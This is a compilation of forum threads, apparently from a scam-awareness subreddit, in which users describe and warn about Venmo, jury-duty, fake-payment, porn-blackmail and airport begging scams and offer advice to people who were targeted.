- Depending on how much info he has on his Venmo account it could be hacked and they can see that you tipped him for putting the bed together and are running with it but it‚Äôs unsettling, if they say anything else I would go down tomorrow and file a police report just in case but $170 isn‚Äôt I‚Äôm going to come and do something physical/threatening type money so hopefully you can just contact Venmo and be done with it. :(
- Since his name was changed, it sounds like the guy's account might be hacked tbh. 

I wouldn't contact them, I mean what can they do? And an innocent guy might lose his job. You should contact Venmo instead.
- I would be contacting the store as well and let them know that their 3rd party hiree has been comprimised. Chances are you are not the only person they are trying this with. 

Hacked or not, this is harrassment and threats are made to you. Document everything and keep it in a safe place. Report to Venmo. Do not touch the money. Let Venmo charge it back.
- OK I just realized that the lady who sent you that text message his girlfriend she had specific information such as he put a bed together for you so that makes it seem more plausible that it might not be a hack - unless in the comment/reason portion when you sent him a tip you actually listed it as the reason for the transaction and thanking him for putting the bed together
- If you don‚Äôt accept the money, I think you could even contact Venmo and ask them to please cancel those transactions and explain to them. What is going on that you think it‚Äôs a scam you don‚Äôt know if you‚Äôre being threatened but you don‚Äôt want to send anything back to him in case of it, being a fraudulent situation that could backfire on you. It could be a simple case of accidents, but it could also be something more sinister and for sure contact Wayfarer-Because that is absolutely scary and really informative. I hope you figure all this out and please stay safe.
- Wayfair is a drop shipper. They have no warehouses, inventory, or shipping facilities. Everything is third party.
- Venmo won't take back the money "returned" to the scammer because that transaction was legitimately sent. The app did what the victim told it to do. The original transaction was fraudulent, the "return" is not so Venmo washes their hands of it at that point.

e: to add a little more, so yes for the scammers it's a giant shell game of accounts until they can get ahead long enough to withdraw it to a money mule or get it converted to crypto or whatever other means they're using.
- And being able to say Venmo is handling it takes the pressure off of you. Just don‚Äôt touch the money and let it get taken back out by Venmo
- [removed]
- That's bullshit. I know people that work at Wayfair Distribution Centers. Hell, I interviewed for a job at their one in Savannah.
- Can't they just convert to crypto directly from the stolen account? Bc if that is possible all the venmo stuff is completely useless (if i understand correctly ofc)
- Who has these to hand

Title: A jury duty scam almost got me today
Body: Hi all, I received a call from a well-spoken man who transferred me to another similar person claiming to be a sergeant with the local police department. He said I missed a jury duty and cited a previous address and that the summons may have gone there. I needed to come into a police station and sign a form saying I didn't receive the notice. Also provided two 'citation' numbers for missing jury duty and contempt of court. This needed to be resolved today or I could have an arrest warrant. He told me to park at the local police station and would meet me there and give directions on what to do inside the station. Also that I needed to bring a $1000 retainer which would be given back when my name was cleared.

Writing it out, it sounds obviously fishy but at the time was somewhat convincing. I hung up on them and verified with the local police station this is in fact a scam. They kept calling me back and I picked up and said need to verify with another police officer and calling 911, they immediately hung up and didn't call back...

I'm not sure what would have happened had I gone, but possibly a gun pulled on me in the parking lot?

Please stay safe out there.

**
- It's good you trusted your gut.

I doubt they would have followed through on that plan. Probably would have told you for security reasons we cannot accept cash and you'd have to deposit it into an ATM or buy gift cards.

Just my hypothesis.
- No gun would have been pulled on you; it's unlikely that the scammers are local.

Someone else posted a similar story recently, the scammers kept him on the phone "on the way" to the police station, but they never actually had him go to a police station. He was directed to go to a series of ATMs and then a Bitcoin machine. At that point it's over, they've got the money, no need to mug you.
- Government is very busy/lazy internally and they do not have time to make phone calls just to ‚Äúask‚Äù people to come in and get arrested. Just like true IRS do not have the time to call people and ask for tax refund. Gov does things via mail and they do that slowly; if you feel rushed to do xyz then 99% meant it‚Äôs not from the gov.
- My wife got a similar call, claiming to be from the Marion County Sheriff's Office. The Caller ID info said "Marion County" but the display didn't show the entire office name. My wife was transferred from one officer to another, then to the person in charge of the main door. She was told that if she hung up she would be arrested. We were directed to bring $4,500 to the Sheriff's Office, at which point I asked how we were suppose to get ahold of that kind of money two hours after my bank had closed. Suddenly the bail we were to bring dropped to $4,000 and then $3,500.

While my wife was in a panic, my thought was to verify it was really from the Sheriff's Office. They offered to text me something and I could double-check the number against the Sheriff Office's official web page, but I said I wanted to verify with a number ***I dial*** (I know about spoofing). They directed us to the local Walmart, to the Financial Services Desk. Just after we got in line, I got through the Sheriff's non-emergency number, started explaining the situation, and they said it was a scam. I waved my wife off, she hung up, and we hadn't heard from those callers since, nor has my wife been detained to show up at a judge to explain why she failed to show for jury duty.

After we got back home, I had time to double-check the caller-id of the caller and it wasn't the Marion County Sheriff's Office; instead, it was the Marion County Attorney General's Office. Had we known that, w would have known right away it was a scam.

We would have also known it was a scam if they had directed us to buy some form of gift card and read off a number since they had already told us that they don't accept credit cards and gift cards wouldn't leave a trail to verify we had paid the "bail".

After reading this subreddit since then (about a month now), I think what I would do is tell the caller that I would call the Sheriff's non-emergency number as it appears on the official Marion County's website and what I would need from the caller is how to get the call routed to her so I could verify it was indeed the Sheriff's Office.
- I got a scam call from an Indian caller who used the Agency that I retired from to threaten me. He said the name of my Agency incorrectly. I won't tip them off here.  My Agency was federal and they wanted to send me to my local city hall to deal with it, stopping on the way to get a money card that I would give them the numbers to. I ended up laughing and telling him he was a really bad scammer.
- Yeah, I assume that along the way they would change your destination and have you deposit the money in some kind of bitcoin ATM.

I doubt these scammers are local, I doubt they would want to actually interact with you in person in any way, and I REALLY doubt they would want to pull a gun on you at the local police station.

Glad you caught on to the scam and knew to hang up and then terminate contact.
- Jury summons to the wrong address means nothing. No court will hold you accountable for that.
- The response to any call like this is:

1) Hang up, do not answer callbacks

2) if you must say something, just say, ‚Äúplease call my attorney‚Äù then hang up.
- They likely would have redirected you to buy gift cards or use a Bitcoin ATM to send the money
- I got this call. I thought it was real until they said I had 2 fines of $2500 each. I l knew no fine would be that high.
- Saw a youtube video on scams where an attractive woman was told she would be arrested for somthing (cant remember what).  She was told to go to a Government office.  She was told where to park,  and the scam would have been that they kidnap her in the car park for sex trafficking.  Fortunately she parked in the wrong place, went into the office mildly hysterical, and they rushed her into an office and explained the scam. It had happened before in their carpark,  Fortunately the scammers were arrested.  Scarey stuff
- That would be a long flight for them from ‚Ä¶
- I almost fell for it too. They spoofed the police station number, knew my address. I was in panic worried I will be arrested, ‚Äúthe officer‚Äù was very aggressive, so it kind of blocked my common sense.  I was at my child‚Äôs practice, so I said I can‚Äôt go right now, he started threatening even more, and that‚Äôs when I kind of suspected that there is no way police can talk like that. And then when he mentioned that I need to deposit cash into a ‚Äúcourt kiosk in local Winn Dixie ‚ÄúI burst out laughing and hung up.
- How did you almost fall for this?

Come on, use your brain. ‚Ä¶.. if the cops want to talk to you, they show up at your house.
- Interesting.   Almost sounds like one of the cops was in on it if they are suggesting you go inside the station.
- Why would it get you any day?
- I would have set up the meeting and had a police detective go in your place. They could have grabbed him.
- When they called me they were not local because they said Federal court  in my county, and there is not a federal court there.
- That makes sense.  Thinking on it more there's no way they could risk a physical presence there in case I had a way to contact the police while on the phone with them.
- People DO get calls to turn themselves in.
- I wouldn't even tell the caller a damn thing. Just laugh, hang up and block their number. But, if you decide you want to fuck with them a bit, make sure you have your local PD's real landline number handy, tell them your phone is about to go flat and to ring you back on that landline number. Trust me, they will because they'll think they've hooked you.
- After reading this sub, the thing to take away is you just hang up. No explanations or politeness is owed to criminals, which is who these scammers are. In fact they may literally be incarcerated criminals running this scam from behind bars with smuggled in cell phones. Just hang up.
- Come on, sheriffs are not in the business of collecting money from citizens.
- Never think these calls are real. If you missed jury duty, police don't telephone you.
- Can confirm.
- Thankfully it didn't, scammers exist because they do get people all the time.
- He's in another country.
- Yeah, most scammers aren't interested in putting themselves in physical danger.
- It's super common to send a courier to the location to pick up the payment. The courier is a real professional courier from a real service company, has your name and some reference number you were given on the phone. They deliver the payment to a mule somewhere else.
- Yeah. But that's when they KNOW that they were supposed to go to court because they had already stood before a judge to discuss whatever they're in trouble for.
- Why do people fall for this stuff? It always amazes me!
- Probably. But if he said he would meet it is possible that a mule will be dispatched to collect the cash. 

No risk to the OP because they aren't going, the cops are. Easy ask for the cops because all they have to do is walk outside.
- I doubt you could convince a police detective to spend his time doing this.  I also doubt they would use a mule.  Why would they risk any kind of ability to track back to them?  They would have diverted him and had him deposit money in a bitcoin ATM.  That way they could do the whole thing with zero risk.  That is the point of these scams, zero risks mean you can cast a wide net and hope you can catch 1 fish.
- If these guys actually are there, intending to commit robbery, it could be one guy or several, any of whom are armed. One plain clothes cop who happens to be around is not going to just walk out there and hope for the best.

Title: What is the purpose of this scam on Facebook messenger?
Body: The original text before it was deleted was the person asking me what I would do if 4,000$ just ended up in my cashapp account. This was from a person I went to school with, but we had never been friends and had never talked. Also I never have money in my cashapp account so I'm wondering if they expected me to actually have money in there and remove it somehow?

Anyway, since this, I've received this exact type message two other times from random people over Facebook messenger, with minor adjustments.

- The purpose is: Through trickery they will end up with YOUR money and you will be screwed.
- It's paying a "fee" for various made up reasons to receive your equally made up blessing/ money. You pay them, they flip you the bird and are in the wind. If you're lucky. Some will continue to try to extract/extort money once they see you're receptive. Block/delete and change your FB settings to friends only.
- One entity still made money off you here and that's Facebook itself. FB tolerates, even encourages scammers, because your engagement and conversation with them makes them money. It's been known for a while that you should leave FB.
- The account has been stolen, and any payments you receive will be fraudulent/stolen. The basic grift is that they give you "free money" and then ask you pass some of it on, perhaps to a "charity."

Then the payment you received is clawed back. Because the money either didn't exist in the first place, or was stolen from someone else. But you're still on the hook for the money you sent. And that's how the fraud works. CashApp pays out in good faith, then comes back to you to make up the shortfall. Run-of-the-mill !fakepayment scheme.
- The number one rule of avoiding scams is that...they are always evolving and just because you don't see how it could possibly be a scam...its still a scam.
- ‚ÄúThey doing this to help people‚Äù is not how someone talks who works at these types of companies, lol
- A: See, they MAKE money by giving away MORE money! Brilliant isn't it?

B: How does that work? 

A: They make up the loss in VOLUME!

- Hi /u/Shield_Lyger, AutoModerator has been summoned to explain the Fake payment scam.

The fake payment scam occurs when someone tries to trick you into thinking that you have received a legitimate payment when no such payment has been made. The most common method they use is sending you an email meant to look like a payment confirmation. In some cases the emails will be almost indistinguishable to a legitimate email sent by the payment service. Scammers are known to also show you screenshots instead of an email. Never trust a screenshot a stranger shows you, because it is probably doctored.

Scammers [spoof](https://en.wikipedia.org/wiki/Email_spoofing) the 'from' email to match an official address, and make you think you received a legitimate email. To combat a fake payment scam, verify online payments by logging in directly to the service. Do not check your junk folder, and do not assume a payment is legitimate based on an email alone. If a payment isn't reflected on your account and the person you are dealing with insists they have sent it, call support and ask about it. [Here](https://i.imgur.com/X9xn8uw.jpg) is an image of a scammer trying to pull off a fake payment scam. There is also a variant of the fake payment scam where you will receive a legitimate but fraudulent payment.

A variant of the fake payment email is just an advance fee scam: the scammer tries to convince you that your funds are on hold, and that you have to upgrade your account by sending the scammer some money to authorize the payment. No payment processor works like this. If you think you're dealing with a scammer, you're probably right. Always trust your gut.

- Hi /u/YourUsernameForever, AutoModerator has been summoned to explain the Advance fee scam.

The [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam) arises from many different situations: investment opportunities, money transfers, job scams, online purchases of any type and any legality, etc., but the bottom line is always the same, you're expected to pay money to receive money. So you will pay the scammer and receive nothing.

It can be as simple as the scammer asking you to pay them upfront for an item they have listed, or as complex as a drug scam that involves an initial scam site, a scam shipping site, and fake government agents. Sometimes the scammers will simply take your first payment and dissappear, but sometimes they will take your initial payment and then make excuses that lead to you making additional payments.

If you are involved in an advance-fee scam, you should attempt to dispute/chargeback any payments sent to the scammer, you should block the scammer, and you should ignore them if they attempt to contact you again. Thanks to redditor AceyAceyAcey for this script.


**
- Yet.

For you to receive this windfall, you'll need to pay a fee.  Else, they'll send twice the agreed upon amount, and ask for half back to make it 'even'.  The actual money is stolen, and will be eventually taken back from your account.  The half you sent to the scammer willfully is gone

Title: Mall food court employee strongly pushing "free" food
Body: I had a really strange encounter yesterday at a mall and can't think of what the motive would be. I was walking around a mall early in the afternoon yesterday and was strolling through the food court when I heard someone call out. I looked up and saw a guy at a dessert place reaching out a sample of a fried Oreo on a toothpick. I took it and thanked the guy, who then asked me how it was. I gave the guy a thumbs up and said "yeah man, its good."

  
After this, the guy said something like "hang on, I have something else" while running back into the kitchen. I was going to walk off, but thought he may just give me a piece of cookie or something so I stayed close. He then comes back out with a box of about 8 fried Oreos and starts tapping on the register screen and saying he would give me "his discount." I genuinely didn't want the food and definitely wasn't trying to buy anything, so I said "thanks, but I'm good. I just had lunch and I'm stuffed." The guy then got pushy and was saying that it was free, he'd just appreciate me leaving a tip, while still tapping the computer.  Throughout the encounter, he was also being really buddy-buddy the whole time saying stuff like "hey, I like you" which I thought was really weird for the situation. I reiterated that I wasn't interested again, and he became more annoyed but stated again it was free.  I just left at this point and he scoffed while I walked off.

  
The main thing I'm wondering is, if I had tapped my card, could he have retroactively charged a large amount to it? When he got on the register, I was immediately suspicious and definitely was not going to get my card out, but I've never heard of people being able to add additional charges. I also don't understand what else he could've been doing as he doing way too much for him to be hoping for a couple dollars of tip and he was really annoyed when I didn't take the food.

- Yeah ... nope. Whatever he was doing, the minute it involved your credit card it was shady. 

If the guy was wearing a uniform or otherwise identified as actually working at that place, you might phone the manager and report the incident.
- That's suspicious AF. It seems like he was playing the happy salesman while trying to scam you.
- Low key sounds like someone on strong stimulants hoping for a tip.¬† Overly friendly, giving something for free while very much expecting a return, getting lost/caught up in the computer screen.¬†¬†


Or maybe they had to make a quota of sales of those cookies?
- Giving away someone else's property while scoring a tip for himself
- Once they have your card, they have your card.
- Eight fried Oreos? I don‚Äôt know what that would clog up more, my arteries or colon.
- He was wearing a uniform. There was also a second employee behind the counter as well who didn't say anything the whole time.
- I considered maybe it was just a weird to get rid of them too. He didn't seem wired or anything, just trying hard to be charismatic.
- They're definitely not something you can binge on lol.
- Yeah, whatever he was doing, the manager needs to know about it. If it was somehow legit, he needs better training. But those jobs do not typically include tipping. (Although they probably should!)

- Hi /u/Bushraakhann, AutoModerator has detected keywords in your post indicating that this is a porn blackmail email scam. The exact wording of the emails varies, but there are generally four main parts. They claim to have placed software/malware on a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video. There are variations of this scam that claim you were caught in a child porn/grooming sting. Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. While this type of blackmail attempt is a bluff, even when the blackmailer actually has compromising videos, paying them does not buy silence - it merely ensures more demands for money. One should never pay a blackmailer... [Here is the /r/scams mega thread on this scam](https://www.reddit.com/r/Scams/comments/8gsjba/the_blackmail_email_scam/).

Illegal? in the country that gave us the Kama Sutra? and the artworks at the temples of Khajuraho? You're joking!

Becouse they make money doing it.

- Why is it a shock though. Scammers have been around forever and they never have any shame or morality. With technology the risk of getting caught is lower, so they are even more fearless.
- I ask them if their mother knows they are scamming people for a living. Some get really upset with me for some reason.

- Hi /u/sarcasmismygame, AutoModerator has been summoned to explain the Blackmail email scam.

The exact wording of the emails varies, but there are generally four main parts. They claim to have installed a RAT (remote access trojan) or any type of software/malware after visiting a porn/adult video site, they claim to have a video of you masturbating or watching porn, they threaten to release the video to your friends/family/loved ones/boss/dog, and they demand that you pay them in order for them to delete the video.

Rest assured that this is a very common spam campaign and there is no truth behind the email or the threats. If they had a video of you, they would show it to you to prove that they have it. [Here](http://www.smh.com.au/technology/gadgets-on-the-go/latest-online-scam-aims-to-prick-porn-watchers-guilty-conscience-20170815-gxwvxl.html) are some news [articles](https://www.bbb.org/denver/news-events/news-releases/2017/09/alert-pornography-email-phishing-scam/) about [this](http://blog.dynamoo.com/2017/10/bogus-porn-blackmail-attempt-from.html) scam.

There is a variant with death threats in which they will usually claim that they have been paid to kill you, and will threaten to kill you/your family if you do not pay a Bitcoin ransom. They usually also claim that they will kill your family if you report the email. The emails are spam and can be ignored.

- That‚Äôs not possible my friends , I get work calls , delivery boys calls and many old friends calls from numbers that are not saved in my contact list . 

+not picking up any phone call is not the solution to this problem, I feel legal actions should be taken on such cases unfortunately our system doesn‚Äôt gives a fuck about cyber crime reports.
- But is it actually illegal? What does the law say? Don‚Äôt believe a random person who calls you. 

This is something I could google, but frankly, I don‚Äôt want ‚Äúis watching porn in India legal?‚Äù in my history.

- There won‚Äôt be legal action. Don‚Äôt hold on to fantasies. Live in the reality that is and make the best choice you can‚Äîwhether that‚Äôs to adapt how you handle unknown callers or leave yourself open to scams by continuing to answer them. You‚Äôre in full control as to how you react to an unavoidable reality.
- Please answer the question.¬† Is pornography illegal to watch in India?
- I didn‚Äôt suffer in handling unknown callers neither I got scammed . Also I‚Äôm not holding onto fantasies ,  legal actions are not fantasies my dear.

Title: The guilt of not knowing - Airport formula and diaper scam
Body: How do you deal with the guilt of not knowing whether you sidestepped a scam or denied a person in crisis aid? 

Me, the wife and our 8 week old made a trip back home. Father in law was picking us up, and this woman appeared out of nowhere in the parking lot of the airport.
She's got a ratty phone and starts talking about how she's not a beggar but desperately needs money for formula and diapers. She's just got out of an abusive relationship 2 days ago,I would be giving them dignity, good Christians, Yada Yada.


No kid in sight, and when FIL questions this he gets ignored. I have 0 cash on me, but this is no issue, she asks what bank I'm with and immediately knows the best way for me to send her cash. She can't figure out what her number is though, so I should just send the cash(100 usd) to myself and give her the code.

At this point I can't get past these red flags, so to get rid of her I send the cash, then cancel the transaction as soon as she left, basically with tears in her eyes at what a good person I am.

I'm like 65% sure this was a scam, but the not knowing is gnawing at me. There is so much poverty around me and I can easily afford 100 usd. What is the answer in a situation like this?

- Oh, friend. That was a million billion percent a scam. Like you said, where‚Äôs the kid? Why can‚Äôt she answer the question? Why is she asking for money AT THE AIRPORT?!

Sleep well. You did not deny a baby food, you thwarted a scammer.
- I'm 100000% sure this is a scam. Pulling on your heart strings is how they make money, they're very good at it! The best answer is to vet a charity that aligns with your values and set up an ongoing donation.
- >I'm like 65% sure this was a scam, but the not knowing is gnawing at me. There is so much poverty around me and I can easily afford 100 usd. What is the answer in a situation like this?

They are banking on exactly that.
- >No kid in sight, and when FIL questions this he gets ignored. 

Here's my red flag.
- I‚Äôd bet someone dropped her off there with this story to scam people at the airport, mainly because ‚Äúshe immediately knows the best way to send her cash.‚Äù

If she‚Äôs truly in need there are multiple social services and charities to help single mothers with housing and baby needs.
- "he asks what bank I'm with and immediately knows the best way for me to send her cash."

Strangers do not know you do or don't have access to payment apps on your person or even if you use a bank or not.  I actually do not keep bank or payment apps on my phone, I use a credit card, cash sometimes, an if I want to donate, I will take a pic of the info and do it from home when I pay bills. 

A few other things:   I don't like being ambushed, and you never know if that may be a distraction for something else.  So at least bring them to an area that is more secure than where you met them like next to a security office or a concierge if you want to interact.   Even if it is a friend or family member, I do not give money, I may pay for what they need directly.
- Next week she'll be collecting donations for a funeral of her now 5 year old son who died of cancer 2 days ago, with a faded sign made 3 years ago.
- Stop feeling guilty and move on with your life.  Its a **SCAM**.  Since you had made up your mind to give just donate the 100 USD to a genuine charity which you know of.
- Think about this. Why would someone be begging for diapers and formula at the airport? That doesn't make sense. Why are they even there? If they have money to take a flight, they have money to buy diapers and formula. If you are worried about not helping someone who needs it, ask for "traveler's aid." Most airports have them, and they might be able to assist the person.
- It‚Äôs always a scam
- Scammers emotionally manipulate people.

Your emotions are affected by this?    Then you're being manipulated.
- The airport scam I ran into was a very well dressed man (late 30s) carrying a small duffel bag. I ran into him day 1 on the terminal train at Newark airport (at EWR the train is before security). I don‚Äôt remember his exact speech but it was lost wallet and he was looking for money for  whatever. He was addressing all the people in the train car. I don‚Äôt recall if anyone gave him money. Funny thing is I flew out again about 3 days later and he was outside of the terminal where you wait for hotel and airport shuttles giving his same spiel. A man looked like he was going to give him some money -I turned loudly and said ‚Äúdamn lost your wallet again. That‚Äôs twice this week.‚Äù  He shot me an FU look and potential mark walked off. 

I will buy someone food (that can‚Äôt be returned) or put gas in their car but I won‚Äôt buy diapers,formula or other common scam items
- It's always a scam. There's no guilt required for bypassing a scammer trying to profit off of empathy for a desperate mother.
- There is community support almost everywhere that can help real people in need. If you were a mother in need hanging out at an airport would not be it. A church or woman‚Äôs support place is where you would go if you were truly in need.
- My first question to her would have been "You have no money, you need diapers and I don't see a child. Why are you at the airport?"
- All cities have government centers, charities, or churches that give our free diapers and baby formula. She was scamming you. They learn how to become an actress for these skits.
- NO! The answer in a situation like this is NO!
- This is a common gypsy scam. Search reddit.

The answer  is to tell them to fuck off.
- People approaching you on the streets like this are almost always scammers. There are shelters, food banks etc, that are better equipped for properly evaluating those in need and offering assistance.
- Not your problem. There are food banks and police can help in energy situations.
- All those red flags that you acknowledge as such and you still unlock your phone and agree to send this scammer money? Dude. You could have been robbed at gun point. With a baby, you really need to stop taking chances like this, stop talking to strangers!
- I‚Äôve been approached by women asking for money for diapers.  Wouldn‚Äôt you know I just received some diapers in the mail as samples?  I brought those out and she didn‚Äôt want diapers.  Well, what do you know?
- I know it‚Äôs hard and a good story does pull at your heart strings but, the best way to deal with people who approach you or try to talk to you randomly in public is to ignore them. Keep walking. Don‚Äôt make eye contact. Don‚Äôt roll down your window. Don‚Äôt give them that ‚Äúin‚Äù because once they have you as an audience they‚Äôre halfway there. If you feel awkward/rude about completely ignoring them, interrupt them by saying ‚Äúnot interested‚Äù, then keep it moving.

For the record that was absolutely a scam.
- You got got.

Now you know for sure.
- This is 100% a scam and a very popular one at that. The scammer is often outside big box stores with their child as a prop or a fake doll wrapped in a blanket. They convince well meaning people with big hearts to purchase diapers and formula because they are down on their luck. If the scammer hits the jackpot they may even get some clothing and toys out of it. Then the scammer will turn around and return the items immediately and pocket the cash. 

There is a TikTok gone viral of a Walmart employee who works the return desk yelling at a scammer and asking security to escort them out. The scammers do it so much the staff recognizes them from repeat returns. You were right to trust your gut. You saved yourself $100!
- Only 65% sure it‚Äôs a scam?  You need to toughen up.
- I called CPS a few times or told them I was calling the police. They would stand on a curb, next to a busy street! Sadly, I watched a toddler grow into a young girl, and her mom had a new baby. Occasionally I‚Äôd stop and tell the young girl she didn‚Äôt have to do this ‚Äúbegging‚Äù and that she should be in school. Mom always packed up and left for the day. Currently, I see a woman who puts a leg brace on before asking for ‚Äúhelp‚Äù.
- Even if it weren't a scam (which it was), it's still not your problem.
- üö©üö©üö©üö©üö©üö©üö©
- ‚Äújust got out of an abusive relationship‚Äù‚Ä¶ 
then she can go to a d.v. program where they supply food, shelter, diapers, & legal assistance.
- Here‚Äôs one guy who thought he was sending $20 via Apple Pay after two guys had approached him at Target and said that they needed money to bury their baby little brother. However, the scammers wound up taking $4,500 by making an Apple Pay payment request, which the victim had unknowingly approved on his iPhone.

- I had a Mom/Dad dragging 2 kids and an infant hit me up at a gas station for a little gas and some milk/food for the kids. I filled their gas can and bought them food inside, went on to a bar with my friends on the opposite side of Denver. We left the bar at 2 AM stopped at the store and same couple, same sob story. Apparently, I am an asshole because I bought gas and food, but didn't give cash is what Inwas told when I reminded them we had met earlier...
- Always a scam. That‚Äôs what scammers do.
- I get it. We donate to our local food bank and homeless shelter, where we know people on the boards and know the money will be used to great effect locally. Not perfect, people should not use their kids in a scam and it triggers a compassionate response, but it's a scam. As an alternative , if they truly seem to be a DV victim you can offer to call 911 to get them to a shelter. The scammers will refuse.
- If it quacks like a duck...
- The answer is simply NO.
- >What is the answer in a situation like this?

You say "Fuck off" and walk away. If they persist, threaten to call the police and be loud about it.
- You‚Äôre at the airport.  Think of the wrath that will fall on you if this goes sideways, or you get caught up in something sinister.   That‚Äôs how you sleep at night üò¥ üí§ too many red flags
- Every time you free guilty, donate to your local food bank.
- They got credit card machines now! Oh my God. You know what they say, adapt or die. I'm tickled.

What airport? I ran into this exact same scam at the bus stop just outside my college campus. The local scammers had their stories too well rehearsed. 

Same thing, no baby, breathlessly reciting a story about escaping abuse with a baby and needing diaper/ formula money. Wouldn't leave me alone. Stalked me right across campus to the Office of Public Safety. Guess I better go share the scarier story
- I had a woman who needed money for a cheap motel so she could be near her grandfather dying in the hospital. She approached a few of us on a smoke break. A few months later she was back, only this time it was her uncle in the hospital. She was so obviously a junkie she didn't get anything from us. In fact, I called her out the second time.
- If that was me, I'd buy the diapers for her. But Tell her I'll open the bag so they can't return it.
- It‚Äôs a scam. Just tell them ‚Äúno‚Äù. Give money regularly to local, reputable organizations helping the homeless and that‚Äôll help with any guilt you feel.
- Even with a baby in hand it is almost always a scam when approached by a stranger.  I still remember a lady begging outside a church in Nicaragua, she looked like she was starving and straight bones.  2 hrs later when we were lost and walking down an alley saw the same person counting out about 300-400 USD that she had made that day.
- The powdered milk scam is big overseas. I saved a young French guy who was in the act of buying the overpriced tin of powdered milk. They then split the money with the store owner. The woman, who couldn't speak English, suddenly cursed me out in a litany of English curse words.
- That definitely sounds like a scam, especially with all those red flags ‚Äîno kid in sight, avoiding questions, and immediately knowing how to get the money sent. 

These kinds of stories are designed to make you act fast and not think too much.

Don‚Äôt feel guilty. You trusted your instincts, and it‚Äôs better to be cautious in situations like this. If someone is truly in need, some organizations and charities can help. 

Sharing your story is a good reminder for everyone to stay alert!
- Scam-a-rama. Didn't Krishna's beg at airports once? Just say "No thank you" and walk away.
- As for whatever guilt remains, donate what you would have given, if it were not a scam, to an organisation that would help in a case like this.
- Scam.  

Donate directly to a local battered women‚Äôs shelter and/or food pantry.  You could also volunteer to help them run their operations.  I used to work for a food charity, there are many programs to help people in need.  The recipients usually have jobs (contrary to stereotypes most poor people work, the jobs just don‚Äôt pay enough) and don‚Äôt go begging from strangers.  Battered women especially tend to keep a low profile and wouldn‚Äôt be out begging in public where their abusers could easily find them, in fact the locations of the safe houses have to be kept secret.  There could certainly be someone who‚Äôs in a bind and is out asking for help, but unless you know them personally or have your own knowledge of their situation, the only way to know you‚Äôre actually helping is to go thru a legitimate organization.  

Research the organizations you donate to, some of them are basically grifts that pay their directors huge salaries, but if a food pantry is associated with Feeding America (if you‚Äôre in the US) they are vetted and have to meet standards.  Religious run shelters and pantries tend to be legit as well, especially of they are run by volunteers.  Organizations staffed/run by tired senior citizens who are from the community they are serving tend to be legit.  

It‚Äôs good you want to do the right thing, do a little research and there probably a ton of organizations in your area that are in need of help.
- I don't feel the slightest guilt ignoring beggars, ever

No or not even respond and keep on walking
- Was this in the cleared area of the airport, I.e. past security?  We were just talking about another one of these a few days ago ‚Äî getting begged in the gate area.   And I had an incident like that a decade ago and commented about it on that thread, it was a guy who said he needed some money to feed his wife and kid, something went wrong with his flight and it‚Äôs super delayed now and they are hungry, etc.   Without missing a beat I said ‚Äúsure, can I see your boarding pass?‚Äù and what followed was probably the most awkward 5 minutes of him scrolling through a beat up phone pretending (I assume) to find his boarding pass.

To this day I have no idea how he got past security.   I figured he must have been a low wage worker at the airport in some other job, and this was a side hustle he does on his way out when his shift is over.
- Definitely a scam.

I would have offered to help her find a local shelter or something. Someone in genuine need will either have a ready answer ("oh, I'm already housed there) or be grateful for whatever help they are receiving. The fact that she couldn't easily explain where the child was (and how hard is it to say with my mom or something?) is a pretty good sign that it was a scam.
- This scam is reported here every single day
- Sounds like a scam. I‚Äôd never give ANYONE any personal information especially a code!  
It‚Äôs unfortunate but we must protect ourselves.
- up that 65% to 101%. 

The chances of you actually encountering someone with this legitimate need? Low enough it will NEVER happen to you.

Ever.

Don't let the emotion win. That's the whole angle. 

Math this shit and sleep like a baby.
- I‚Äôve fallen for this with eyes wide open before. 

Fake pregnant lady walks up with a complicated story about being locked out and needing money for the train and a cab. I told her I don‚Äôt believe her for one second and that I know she‚Äôs a fraud but gave her 40 bucks anyways to free my mind. 

I think of it like a mugging that leaves my positive self image in tact. I wish more criminals did this instead of threatening violence tbh.
- Sometimes I feel the same way / was I just simply a jaded jerk or were my instincts right. I just move on‚Ä¶
- HUGE SCAM
- If you were near a place where you could buy formula and diapers, if you were feeling generous, you might offer to buy some formula and diapers for her, but I bet she would find reasons why that wouldn't work.

At least my offer to buy food for one person begging for food money outside a drug store was met with excuses of why he couldn't go in the store ("I can't leave my bicycle out here") and a woman outside a grocery store  asking for quarters for a payphone refused my offer to drop my quarters in the payphone for her and she went off seeking the next person leaving the store to ask for quarters.

Offering the actual product rather than cash isn't a guarantee that they aren't trying to scam you ... people have told me they bought hamburgers for beggars and see in the rear view mirror that the scammers just threw away the food.
- oh you can rest assured you sidestepped a scam.    good for you for seeing the red flags!
- If someone has a baby and needs money for diapers/food there are better ways of getting it than asking random people in a parking lot. 

I wouldn't feel guilty about this for a nanosecond. 

65% a scam? Come on, don't be absurd. Why would they insist on cash if they had a specific need? More like 99.9999999999999% a scam.
- That‚Äôs a scam.
- Don't talk to strangers. Either ignore them or loudly say no thank you and move on.
- Yeah, this was almost certainly a scam, but it's a natural feeling when someone asks for help.  Having to mistrust everyone is a sucky way to go through life, for sure, and most people don't really want to live that way, but unfortunately that's what scammers count on. The best solution is to find legitimate charities that do work you support, give what you can afford, and in other situations, tell yourself that you've done your part, and that you can't help everyone.
- My daughter and I pretend to be deaf if they are extremely aggressive and abusive. I know it sounds horrible, but it has gotten us quickly out of scary situations.  üò¨
- Cmon, of course it's ascam.
- First of all, nobody suddenly discovers that they need diapers and formula in the middle of an airport parking lot. They don't sell that stuff at the airport so I'd have to ask how they even got there in the first place. If they were going on a trip I'm sure they would have already known that before leaving the house. 

I often run into similar situations at those full service rest areas that they have along the interstate highway. Someone will approach me with their hard luck story about how they've been living on the street.  But the rest stop is in the MIDDLE of the northbound and southbound lanes! How did they cross 6 lanes of 70 MPH traffic without a car? And why would they walk to a location where there's NO CIVILIZATION anywhere within a 10-15 mile radius? Or in other words, you walked the better part of 10 miles, crossed 6 lanes of interstate traffic just so you can ask for $5 for something to eat. It doesn't make a whole lot of sense. 

Well actually it DOES make sense that beggars and scammers will go places where everyone else has plenty of money and their guard is down because they're traveling and having a good time because their on vacation.. and of course anyone who is in a festive mood is going to feel bad for anyone who's stuck at an airport with no diapers.
- Answer is it‚Äôs definitely a scam and if they are constantly asking if you say you don‚Äôt have cash then there‚Äôs your sign. Don‚Äôt feel bad. They don‚Äôt feel bad.
- 65% chance of being a scam?? Try 99.9%
